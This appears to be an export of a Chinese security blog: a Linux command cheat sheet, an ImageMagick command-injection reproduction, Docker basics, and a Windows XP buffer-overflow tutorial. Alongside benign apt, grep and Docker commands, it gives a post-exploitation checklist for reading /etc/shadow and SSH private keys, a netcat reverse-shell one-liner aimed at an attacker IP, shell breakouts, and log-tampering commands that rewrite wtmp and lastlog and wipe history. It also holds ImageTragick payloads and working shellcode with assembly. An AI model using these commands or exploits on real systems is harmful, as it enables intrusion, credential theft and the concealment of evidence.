dist-upgrade 升级系统 sudo apt-get dselect-upgrade 使用 dselect 升级 apt-cache depends package 了解使用依赖 apt-cache rdepends package 是查看该包被哪些包依赖 sudo apt-get build-dep package 安装相关的编译环境 apt-get source package 下载该包的源代码 sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包 sudo apt-get check 检查是否有损坏的依赖 sudo apt-get clean 清理所有软件缓存（即缓存在/var/cache/apt/archives目录里的deb包） sudo apt-get autoremove 删除系统不再使用的孤立软件 apt-get -qq –print-uris install ssh | cut -d\’ -f2 查看包在服务器上面的地址# 清除所以删除包的残余配置文件 dpkg -l |grep ^rc|awk ‘&#123;print $2&#125;’ |tr [&quot;\n&quot;] [&quot; “]|sudo xargs dpkg -P -# 查看安装软件时下载包的临时存放目录 ls /var/cache/apt/archives# 备份当前系统安装的所有包的列表 dpkg –get-selections | grep -v deinstall &gt; ~/somefile# 从上面备份的安装包的列表文件恢复所有包 dpkg –set-selections &lt; ~/somefile sudo dselect# 查看内核 uname -a# 查看Ubuntu版本 cat /etc/issue# 查看内核加载的模块 lsmod# 查看PCI设备 lspci# 查看USB设备 lsusb# 查看网卡状态 sudo ethtool eth0# 查看CPU信息 cat /proc/cpuinfo# 显示当前硬件信息 lshw# 查看硬盘的分区 sudo fdisk -l# 查看IDE硬盘信息 sudo hdparm -i /dev/hda# 查看STAT硬盘信息 sudo hdparm -I /dev/sda sudo blktool /dev/sda id# 如果你想在当前目录下 查找&quot;hello,world!&quot;字符串,可以这样:grep -rn &quot;hello,world!&quot; ** : 表示当前目录所有文件，也可以是某个文件名-r 是递归查找-n 是显示行号-R 查找所有文件包含子目录-i 忽略大小写下面是一些有意思的命令行参数：grep -i pattern files ：不区分大小写地搜索。默认情况区分大小写，grep -l pattern files ：只列出匹配的文件名，grep -L pattern files ：列出不匹配的文件名，grep -w pattern files ：只匹配整个单词，而不是字符串的一部分（如匹配‘magic’，而不是‘magical’），grep -C number pattern files ：匹配的上下文分别显示[number]行，grep pattern1 | pattern2 files ：显示匹配 pattern1 或 pattern2 的行，grep pattern1 files | grep pattern2 ：显示既匹配 pattern1 又匹配 pattern2 的行。这里还有些用于搜索的特殊符号：\&lt; 和 \&gt; 分别标注单词的开始与结尾。例如：grep man * 会匹配 ‘Batman’、‘manic’、‘man’等，grep &apos;\&lt;man&apos; * 匹配‘manic’和‘man’，但不是‘Batman’，grep &apos;\&lt;man\&gt;&apos; 只匹配‘man’，而不是‘Batman’或‘manic’等其他的字符串。&apos;^&apos;：指匹配的字符串在行首，&apos;$&apos;：指匹配的字符串在行尾， xargs配合grep查找find -type f -name &apos;*.php&apos;|xargs grep &apos;GroupRecord&apos;``## 信息收集``` bash 系统是什么版本?cat /etc/issuecat /etc/*-releasecat /etc/lsb-releasecat /etc/redhat-release它的内核版本是什么？cat /proc/version uname -auname -mrsrpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz它的环境变量里有些什么？cat /etc/profilecat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logoutenvset是否有台打印机？lpstat -a应用与服务查看进程打开的文件lsof -p正在运行什么服务？什么样的服务具有什么用户权限？ps auxps -eftopcat /etc/service哪些服务具有root的权限？这些服务里你看起来那些有漏洞,进行再次检查！ps aux | grep rootps -ef | grep root安装了哪些应用程序？他们是什么版本？哪些是当前正在运行的？ls -alh /usr/bin/ls -alh /sbin/dpkg -lrpm -qals -alh /var/cache/apt/archivesOls -alh /var/cache/yum/Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/主机上有哪些工作计划？crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root主机上可能有哪些纯文本用户名和密码?grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla通信与网络NIC(s)，系统有哪些？它是连接到哪一个网络？/sbin/ifconfig -acat /etc/network/interfacescat /etc/sysconfig/network网络配置设置是什么？网络中有什么样的服务器？DHCP服务器？DNS服务器？网关？cat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networksiptables -Lhostnamednsdomainname其他用户主机与系统的通信？lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw缓存？IP和/或MAC地址?arp -eroute/sbin/route -nee数据包可能嗅探吗？可以看出什么？监听流量$ tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]$ tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21你如何get一个shell？你如何与系统进行交互？# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/nc -lvp 4444 # Attacker. 输入 (命令)nc -lvp 4445 # Attacker. 输出(结果)telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # 在目标系统上. 使用 攻击者的IP!如何端口转发？（端口重定向）# rinetd# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch# fpipe# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]FPipe.exe -l 80 -r 80 -s 80 192.168.1.7# ssh# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Portssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port#mknod# mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipemknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe # Port Relaymknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080)mknodbackpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nclocalhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080)建立隧道可能吗？本地，远程发送命令ssh -D 127.0.0.1:9050 -N [username]@[ip]proxychains ifconfigmm信息和用户你是谁？哪个id登录？谁已经登录？还有谁在这里？谁可以做什么呢？idwhowlastcat /etc/passwd | cut -d: # List of usersgrep -v -E &quot;^#&quot; /etc/passwd | awk -F: &amp;#039;$3 == 0 &#123; print $1&#125;&apos; # List of super usersawk -F: &apos;($3 == &quot;0&quot;) &#123;print&#125;&amp;#039; /etc/passwd # List of super userscat /etc/sudoerssudo -l可以找到什么敏感文件？cat /etc/passwdcat /etc/groupcat /etc/shadowls -alh /var/mail/什么有趣的文件在home/directorie（S）里？如果有权限访问ls -ahlR /root/ls -ahlR /home/是否有任何密码，脚本，数据库，配置文件或日志文件？密码默认路径和位置cat /var/apache2/config.inccat /var/lib/mysql/mysql/user.MYDcat /root/anaconda-ks.cfg用户做过什么？是否有任何密码呢？他们有没有编辑什么？cat ~/.bash_historycat ~/.nano_historycat ~/.atftp_historycat ~/.mysql_historycat ~/.php_history可以找到什么样的用户信息cat ~/.bashrccat ~/.profilecat /var/mail/rootcat /var/spool/mail/rootprivate-key 信息能否被发现？cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key文件系统哪些用户可以写配置文件在/ etc /？能够重新配置服务？ls -aRl /etc/ | awk ‘$1 ~ /^.*w.*/&apos; 2&gt;/dev/null # Anyonels -aRl /etc/ | awk ’$1 ~ /^..w/&apos; 2&gt;/dev/null # Ownerls -aRl /etc/ | awk ‘$1 ~ /^.....w/&apos; 2&gt;/dev/null # Groupls -aRl /etc/ | awk ’;$1 ~ /w.$/&apos; 2&gt;/dev/null # Otherfind /etc/ -readable -type f 2&gt;/dev/null # Anyonefind /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone在/ var /有什么可以发现？ls -alh /var/logls -alh /var/maills -alh /var/spoolls -alh /var/spool/lpdls -alh /var/lib/pgsqlls -alh /var/lib/mysqlcat /var/lib/dhcp3/dhclient.leases网站上的任何隐藏配置/文件?配置文件与数据库信息？ls -alhR /var/www/ls -alhR /srv/www/htdocs/ls -alhR /usr/local/www/apache22/data/ls -alhR /opt/lampp/htdocs/ls -alhR /var/www/html/有什么在日志文件里?（什么能够帮助到“本地文件包含”?)# http://www.thegeekstuff.com/2011/08/linux-var-log-files/cat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/#auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,mail.log, mail.warn, messages, syslog, udev, wtmp(有什么文件?log.系统引导……)如果命令限制，你可以打出哪些突破它的限制？python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;echo os.system(&apos;/bin/bash&apos;)/bin/sh -i如何安装文件系统？mountdf -h是否有挂载的文件系统？cat /etc/fstab什么是高级Linux文件权限使用？Sticky bits, SUID 和GUIDfind / -perm -1000 -type d 2&gt;/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename herefind / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2&gt;/dev/null; done #Looks in &amp;#039;common&amp;#039; places: /bin, /sbin, /usr/bin, /usr/sbin,/usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID(Quicker search)#findstarting at root (/), SGIDorSUID, not Symbolic links, only 3folders deep, list with more detail and hideany errors (e.g. permissiondenied)find/-perm -g=s-o-perm -4000! -type l-maxdepth 3 -exec ls -ld &#123;&#125; ;2&gt;/dev/null在哪些目录可以写入和执行呢？几个“共同”的目录：/ tmp目录，/var / tmp目录/ dev /shm目录find / -writable -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -222 -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -o+w -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -o+x -type d 2&gt;/dev/null # world-executable foldersfind / ( -perm -o+w -perm -o+x ) -type d 2&gt;/dev/null # world-writeable &amp; executable foldersAny &quot;problem&quot; files？可写的的，“没有使用&quot;的文件find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print # world-writeable filesfind /dir -xdev ( -nouser -o -nogroup ) -print # Noowner files准备和查找漏洞利用代码安装了什么开发工具/语言/支持？find / -name perl*find / -name python*find / -name gcc*find / -name cc如何上传文件？find / -name wgetfind / -name nc*find / -name netcat*find / -name tftp*find / -name ftp 安全检查123456789101112131415161718192021222324252627282930313233# 查看指定端口的pid netstat -antup | grep 5001# 杀死指定pid 进程 kill -9 12312# 创建新用户 orleven$ useradd orleven# 新用户允许使用sudo$ chmod u+w /etc/sudoers$ vi /etc/sudoers 找到这行 root ALL=(ALL:ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)$ chmod u-w /etc/sudoers# 生产机器禁止ROOT远程SSH登录：$ vi /etc/ssh/sshd_config PermitRootLogin no$ service sshd restart# 设置允许远程登录$ vi /etc/ssh/sshd_config AllowUsers orleven$ service sshd restart# 系统怎么打内核，操作系统，所有应用程序，插件和Web服务的最新补丁？$ apt-get update &amp;&amp; apt-get upgrade$ yum update# 查看进程： ps -e | grep ssh ps -e -o &apos;%C : %p : %z : %a&apos;|sort -k5 -nr 按内存从大到小排列 ps -e -o &apos;%C : %p : %z : %a&apos;|sort -nr 按cpu利用率从大到小排列 这里附上一个网传的Linux安全检查脚本 清除日志12345678910111213141516171819202122232425262728293031323334353637383940414243登录后执行下面命令,不记录历史命令(.bash_history)unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0last命令结果修改ip(如果修改用户什么的,自己修改下把)Centosutmpdump /var/log/wtmp |sed "s/8.8.8.8/1.1.1.1/g" |utmpdump -r &gt;/tmp/wtmp1 &amp;&amp;\mv /tmp/wtmp1 /var/log/wtmpunix/usr/lib/acct/fwtmp &lt; /var/adm/wtmpx | sed "s/192.168.8.88/localhost/g" | /usr/lib/acct/fwtmp -ic &gt; /var/adm/wtmpxlastlog 修改替换sed -i 's/192.168.1.1/8.8.8.8/' /var/log/lastlog不记录ssh公钥在本地.ssh目录中ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i多次覆盖文件，使得即使是昂贵的硬件探测仪器也难以将数据复原 -n, --iterations=N 覆盖N 次，而非使用默认的3 次。shred -n 31337 -z -u filename-n, --iterations=N 覆盖N 次，而非使用默认的3 次-z, --zero 最后一次使用0 进行覆盖以隐藏覆盖动作-u, --remove 覆盖后截断并删除文件登录账户 w下管理员是看不到的ssh -T somebody@8.8.8.8 /bin/bash –i日志文件/var/log/message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一/var/log/secure 与安全相关的日志信息/var/log/maillog 与邮件相关的日志信息/var/log/cron 与定时任务相关的日志信息/var/log/spooler 与UUCP和news设备相关的日志信息/var/log/boot.log 守护进程启动和停止相关的日志消息/var/log/btmp – 记录所有失败登录信息 命令:lastb/var/log/auth.log 系统授权信息，包括用户登录和使用的权限机制等 (debian)删除部分日志,比如以当天日期或者自己的登录ipsed -i '/当前时间/'d /var/log/messages 个人建议登录linux,使用winscp工具连接,选择sftp协议,执行命令或者操作目录文件,在history,lastlog,last,w下不会有记录,但是在/var/log/secure会有sftp连接记录,只需要清理登录日志就可以了]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 安装 ImageMagick 以及命令执行漏洞复现]]></title>
    <url>%2F2016%2F12%2F01%2FimageMagick-linux-code-execution%2F</url>
    <content type="text"><![CDATA[概述最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。 安装123456tar -vxjf ImageMagick-6.9.5-3.tar.bz2 cd ImageMagick-6.9.5-3./configure --prefix=/opt/bokee/ImageMagick --enable-share --enable-staticmakemake installvim ~/.bash_profile 输入 1234PATH=$PATH:/opt/bokee/ImageMagick/binexport LD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/libexport DYLD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/libexport PATH 12source ~/.bash_profileconvert -version 这样就安装完毕了ImageMagick，下面安装php扩展 12345678910111213wget http://pecl.php.net/get/imagick-3.1.2.tgztar zxvf imagick-3.1.2.tgzcd imagick-3.1.2/opt/lampp/bin/phpize # 据自己的情况找到这个文件运行 find / -name phpizeexport PKG_CONFIG_PATH=/opt/bokee/ImageMagick/lib/pkgconfig/export C_INCLUDE_PATH=$C_INCLUDE_PATH:/opt/bokee/ImageMagick/include/ImageMagick-6/./configure --with-imagick=/opt/bokee/ImageMagickmakemake installldconfigfind / -name php.inivi /opt/lampp/etc/php.ini添加：extension = "imagick.so" 错误以及解决方法运行/usr/local/webserver/php/bin/phpize时出现： 123456Configuring for:PHP Api Version: 20041225Zend Module Api No: 20060613Zend Extension Api No: 220060519Cannot find autoconf. Please check your autoconf installation and the$PHP_AUTOCONF environment variable. Then, rerun this script. 解决方法： 12345678910cd /usr/srcwget http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gztar -zvxf m4-1.4.9.tar.gzcd m4-1.4.9/./configure &amp;&amp; make &amp;&amp; make installcd ../wget http://ftp.gnu.org/gnu/autoconf/autoconf-2.62.tar.gztar -zvxf autoconf-2.62.tar.gzcd autoconf-2.62/./configure &amp;&amp; make &amp;&amp; make install 如果出现如下错误： 1configure: error: Cannot find php-config. Please use --with-php-config=PATH 解决方法： 12find / -name php-config./configure --with-php-config=/opt/lampp/bin/php-config --with-imagick=/opt/bokee/ImageMagick 如果出现如下错误： 1wand/MagickWand.h: No such file or directory 解决方法： 1export C_INCLUDE_PATH=$C_INCLUDE_PATH:/opt/bokee/ImageMagick/include/ImageMagick-6/ 如果出现如下错误： 1XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system. 解决方法： 1234567891011121314vi /opt/lampp/lampp# XAMPP is currently 32 bit only#case `uname -m` in# *_64)# if /opt/lampp/bin/php -v &gt; /dev/null 2&gt;&amp;1# then# :# else# $de &amp;&amp; echo &quot;XAMPP gibt es zur Zeit nur als 32-Bit Applikation. Bitte verwende eine 32-Bit Kompatibilitaetsbibliothek fuer Dein System.&quot;# $de || echo &quot;XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system.&quot;# exit# fi# ;;#esac 原理分析与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。 ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的. 在ImageMagick的默认配置文件里可以看到所有的委托：/etc/ImageMagick/delegates.xml拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。 漏洞复现ImageMagick popen_utf8命令注入 漏洞版本: ImageMagick 6.9.3-9及以下 其实就是文件名引发的命令执行。 payload : 123&lt;?phpnew Imagick('|touch /tmp/niubl');?&gt; ImageMagick 命令注入 漏洞版本: ImageMagick 6.9.3-9及以下 payload : 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://example.com/image.jpg&quot;|ls &quot;-la)&apos;pop graphic-context 将以上内容保存为test.png图片，执行convert test.png 1.png，就会执行命令。]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>code execution</tag>
        <tag>imageMagick</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 基础]]></title>
    <url>%2F2016%2F11%2F22%2Fdocker%2F</url>
    <content type="text"><![CDATA[概述Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。 详情创建镜像创建镜像的方法有很多，官方推荐的是直接从官网仓库pull一个，虽然官方的镜像很小，但一些基础的如ping这样的工具都没有安装，所以我选择 openvz的模板 123456# 下载模板$ wget http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64.tar.gz# 导入镜像（由于是网上找的，记得更新源）$ docker import ubuntu-14.04-x86_64.tar.gz ubuntu:base# 查看镜像$ docker images 常用指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# 进入虚拟机$ docker run -t -i ubuntu:base /bin/bash$ docker run -v /home/orleven/docker/common:/tmp -t -i orleven/base:ubuntu_14.04 /bin/bash# 后台运行容器$ Ctrl-P + Ctrl-Q# 保存容器为镜像$ docker commit -m "ubuntu_base" -a "orleven" 942 orleven/base:ubuntu_14.04# 登陆hub$ docker login -u orleven# 将某一个镜像发布到官方网站。$ docker push (镜像名:tag)# 进入容器$ docker attach 432# 运行容器$ docker start id# 下载一个ubuntu镜像$ docker pull (镜像名:tag)# 挂载文件夹 端口映射 镜像名$ docker run -v /home/orleven/docker/web1:/opt/lampp/htdocs -it -p 9001:80 ubuntu:latest$ docker run -v /home/orleven/docker/common:/tmp/ -it -p 9001:80 ubuntu# 可以列出所有安装过的镜像。$ docker images# 查看正在运行的容器$ docker ps# 查看更详细的关于某一个容器的信息。$ docker inspect efe(id 前三位)# 在learn/tutorial镜像里面安装ping程序。(必须带上y)$ docker run learn/tutorial apt-get install -y ping# 查看版本$ docker version # 搜索镜像 $ docker search 镜像名字 # 查看日志$ docker logs# 假设我们要导出的镜像名为orleven/base:ubuntu_14.04 docker save -o ubuntu14.04_base.tar.gz orleven/base:ubuntu_14.04 # 保存镜像至ubuntu14.04_base.tar.gz的文件。这需要一点时间。$ docker export f6c &gt; ./ubuntu14.04_base.tar.gz 特殊指令组合12345678910使用`docker logs`快速查看`access.log`$ docker attach 432$ tail -f access.log$ ctul + p ctul + q$ docker logs清空none$ docker ps -a | grep "Exited" | awk '&#123;print $1 &#125;'|xargs docker stop$ docker ps -a | grep "Exited" | awk '&#123;print $1 &#125;'|xargs docker rm$ docker images|grep none|awk '&#123;print $3 &#125;'|xargs docker rmi]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows XP 溢出]]></title>
    <url>%2F2016%2F11%2F10%2Fwindows-overflow-xp%2F</url>
    <content type="text"><![CDATA[概述虽然我是一只Web菜狗，还要渗透测试实习，但是怎么能不去了解逆向溢出呢。So，先了解Windows XP 溢出好了。 目标代码1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt;char name[] = "abcdef";int main()&#123; char output[8]; strcpy(output, name); for(int i=0;i&lt;8&amp;&amp;output[i];i++) printf("\\0x%x",output[i]); return 0;&#125; 步骤它的运行时这样的： 假如name[] 的字符串变长 ，例如： 1char name[] = &quot;abcdefghijklmnopqrst&quot;; 就会发生溢出，vc6.0 就会报错： 可见后面的值溢出，覆盖了之后的值。 如果name[]的值是这样： 1234567891011121314151617181920212223242526char name[] = &quot;\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41&quot; //以上是覆盖掉name的8个字节以及epb个字节&quot;\x12\x45\xfa\x7f&quot; //以上是jmp esp的地址 sp3中文版的值 &quot;\x55\x8B\xEC\x33\xC0\x50\x50\x50&quot;&quot;\xC6\x45\xF4\x4D&quot;&quot;\xC6\x45\xF5\x53&quot; &quot;\xC6\x45\xF6\x56&quot; &quot;\xC6\x45\xF7\x43&quot;&quot;\xC6\x45\xF8\x52&quot;&quot;\xC6\x45\xF9\x54&quot;&quot;\xC6\x45\xFA\x2E&quot;&quot;\xC6\x45\xFB\x44&quot;&quot;\xC6\x45\xFC\x4C&quot;&quot;\xC6\x45\xFD\x4C&quot;&quot;\x8D\x45\xF4\x50\xBA\x7B\x1D\x80\x7C\xFF\xD2&quot;&quot;\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D&quot;&quot;\x89\x45\xF4\xB8\x61\x6E\x64\x2E&quot; &quot;\x89\x45\xF8\xB8\x63\x6F\x6D\x22&quot;&quot;\x89\x45\xFC\x33\xD2\x88\x55\xFF&quot;&quot;\x8D\x45\xF4\x50\xB8\xC7\x93\xBF\x77\xFF\xD0&quot;;//以上是ShellCode 则会调用cmd命令 至于jmp esp的地址是怎么来的，一般网上都有，或者。用如下程序寻找 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;windows.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #define DLL_NAME "user32.dll" int main() &#123; BYTE *ptr; int position,address; HINSTANCE handle; BOOL done_flag = FALSE; handle = LoadLibrary(DLL_NAME); if(!handle) &#123; printf("load dll error!"); exit(0); &#125; ptr = (BYTE*)handle; for(position = 0; !done_flag; position++) &#123; try &#123; if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4) &#123; int address = (int)ptr + position; printf("OPCODE found at 0x%x\n", address); &#125; &#125; catch(...) &#123; int address = (int)ptr + position; printf("END OF 0x%x\n", address); done_flag = true; &#125; &#125; return 0; &#125; 上述程序中是在user32.dll中寻找jmp esp的机器码FFE4，会查找到很多的结果，选择其中的一个就可以。这里需要特别说明的是，不同的计算机不同的操作系统版本，所找到的jmp esp的地址可能会不一样，就是说jmp esp的地址往往并不是通用的。当然，也会有几个地址是跨版本的，这个在这里不讨论。这次我们选择其中的一个地址——0x7e490b40。由于是小 端显示，所以应当在“OPQR”的位置反向书写，即400b497e。当然这里不能够直接用类似于记事本这样的软件进行编辑，而是需要用十六进制代码编辑 器操作。 至于shellcode如何得出，请继续往下看比如下面这个程序就可以完成开DOS窗口的功能，大家详细看下注释： 123456789101112#include &lt;windows.h&gt;#include &lt;winbase.h&gt;typedef void (*MYPROC)(LPTSTR); //定义函数指针int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary(“msvcrt”); ProcAdd = (MYPROC) GetProcAddress(LibHandle, "system"); //查找System函数地址 (ProcAdd) ("command.com"); //其实就是执行System(“command.com”) return 0;&#125; 程序中用GetProcAddress函数获得System的真实地址，但地址究竟是多少，如何查看呢？如下图断点，然后调试 按alt + 8 以及alt+ 5，出现如下界面 按F10 运行到如下位置 EAX变为77c293c7，说明在我的机器上System( )函数的地址是0x77c293c7。 为什么EAX就是System( )函数的地址呢？那是因为函数执行的返回值，在汇编下通常是放在EAX中的，这算是计算机系统的约定吧，所以GetProcAddress（”System”）的返回值（System函数的地址），就在EAX中，为0x77c293c7。 如下是调用cmd代码 12345678#include &lt;windows.h&gt;int main()&#123; LoadLibrary("msvcrt.dll"); system("command.com"); return 0;&#125; 首先来验证一下，在VC中可以用__asm关键字插入汇编，我们把System(“Command.com”)用我们写的汇编替换，LoadLibrary先不动，然后执行，成功！弹出了我们想要的DOS窗口。 12345678910111213141516171819202122232425262728293031#include &lt;windows.h&gt;int main()&#123; LoadLibrary("msvcrt.dll"); //system("command.com"); _asm&#123; push ebp; mov ebp, esp; xor edi,edi; push edi; //申请4字节空间 push edi; //申请4字节空间 push edi; //申请4字节空间 mov byte ptr[ebp-0ch],63h; //c mov byte ptr[ebp-0bh],6fh; //o mov byte ptr[ebp-0ah],6dh; //m mov byte ptr[ebp-09h],6dh; //m mov byte ptr[ebp-08h],61h; //a mov byte ptr[ebp-07h],6eh; //n mov byte ptr[ebp-06h],64h; //d mov byte ptr[ebp-05h],2eh; //. mov byte ptr[ebp-04h],63h; //c mov byte ptr[ebp-03h],6fh; //o mov byte ptr[ebp-02h],6dh; //m lea eax, [ebp-0ch]; push eax; //command.com串地址作为参数入栈 mov eax, 0x77c293c7; call eax; &#125; return 0;&#125; 同样的道理，LoadLibrary(“msvcrt.dll”)也仿照上面改成汇编，注意LoadLibrary可以用如下程序查找。 12345678910111213#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void (*MYPROC)(LPTSTR);int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary("kernel32"); printf("msvcrt LibHandle = //x%x\n", LibHandle); ProcAdd=(MYPROC)GetProcAddress(LibHandle,"LoadLibraryA"); printf("LoadLibrary = //x%x\n", ProcAdd); return 0;&#125; 可以看到地址为0x7c801d7b 把两段汇编合起来，将其编译、链接、执行，也成功了！ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;windows.h&gt;int main()&#123; //LoadLibrary("msvcrt.dll"); _asm&#123; push ebp; mov ebp,esp; xor eax,eax; push eax; push eax; push eax; mov byte ptr[ebp-0ch],6dh; mov byte ptr[ebp-0bh],73h; mov byte ptr[ebp-0ah],76h; mov byte ptr[ebp-09h],63h; mov byte ptr[ebp-08h],72h; mov byte ptr[ebp-07h],74h; mov byte ptr[ebp-06h],2eh; mov byte ptr[ebp-05h],64h; mov byte ptr[ebp-04h],6ch; mov byte ptr[ebp-03h],6ch; lea eax,[ebp-0ch]; push eax; mov edx, 0x7c801d7b; call edx; &#125; //system("command.com"); _asm&#123; push ebp; mov ebp, esp; xor edi,edi; push edi; push edi; push edi; mov byte ptr[ebp-0ch],63h; mov byte ptr[ebp-0bh],6fh; mov byte ptr[ebp-0ah],6dh; mov byte ptr[ebp-09h],6dh; mov byte ptr[ebp-08h],61h; mov byte ptr[ebp-07h],6eh; mov byte ptr[ebp-06h],64h; mov byte ptr[ebp-05h],2eh; mov byte ptr[ebp-04h],63h; mov byte ptr[ebp-03h],6fh; mov byte ptr[ebp-02h],6dh; lea eax, [ebp-0ch]; push eax; mov eax, 0x77c293c7; call eax; &#125; return 0;&#125; 